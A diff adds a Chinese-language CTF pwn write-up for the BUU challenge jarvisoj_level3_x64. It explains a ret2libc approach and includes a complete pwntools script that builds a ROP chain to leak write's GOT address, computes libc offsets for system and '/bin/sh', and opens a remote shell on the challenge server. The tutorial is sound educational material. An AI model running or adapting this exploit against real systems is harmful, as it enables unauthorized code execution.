@@ -1766,3 +1766,58 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+#### 例题 2：jarvisoj_level3_x64
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level3_x64)
+
+<img width="414" height="129" alt="59e36a73030fbbd65b7f8d31e1949568" src="https://github.com/user-attachments/assets/42402a21-f6b9-4e4b-81c9-8f339a1ce38c" />
+
+依旧栈不可执行。
+
+打开 IDA pro 发现一些有趣的东西。
+
+<img width="1280" height="439" alt="82d1191ba73066ae7d892b23bfd5e346" src="https://github.com/user-attachments/assets/4c95ac85-8bc4-489c-b9f1-4221be2b6d8a" />
+
+<img width="1280" height="291" alt="image" src="https://github.com/user-attachments/assets/1f2a8e71-64f7-4005-ac53-b5772732e974" />
+
+那么我们的大体思路就是利用 `read()` 劫持 `write()` 并打印 write_addr，从而确定 libc 基址。
+
+具体实现如下：
+
+```
+# written by Sonnety
+from pwn import *
+context(os = "linux", arch = "amd64", log_level = "debug")
+host = "node5.buuoj.cn"
+port = 26772
+
+io = remote(host,port)
+# io = process("./level3_x64")
+elf = ELF('./level3_x64')
+offset = 0x88
+main_addr = 0x40061A
+pop_rdi = 0x4006b3
+pop_rsi_r15 = 0x4006b1
+write_plt = elf.plt['write']
+write_got = elf.got['write']    # write(fd←rdi,buf←rsi,count←rdx)
+payload_1 = b'A'*offset + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(114514) + p64(write_plt) + p64(main_addr)
+# 存在 read(0, buf, 0x200u); 使 rdx 足够大，不再更改rdx
+# rdi = 1 , rsi = write_got , r15 = 114514 , rdx = 0x200u
+# r15 = 114514 没有任何意义，只是为了吃掉 pop r15
+def main():
+    io.recvuntil(b"Input:\n")
+    io.sendline(payload_1)
+    leak_data = io.recvn(8)
+    write_addr = u64(leak_data)
+    print(hex(write_addr))  # 0x7f8a1e8842b0 → libc6_2.23-0ubuntu10_amd64
+    libc = write_addr - 0xf72b0
+    system = libc + 0x45260
+    binsh = libc + 0x18cd57
+    payload_2 = b'A'*offset + p64(pop_rdi) + p64(binsh) +p64(system)
+    io.sendline(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
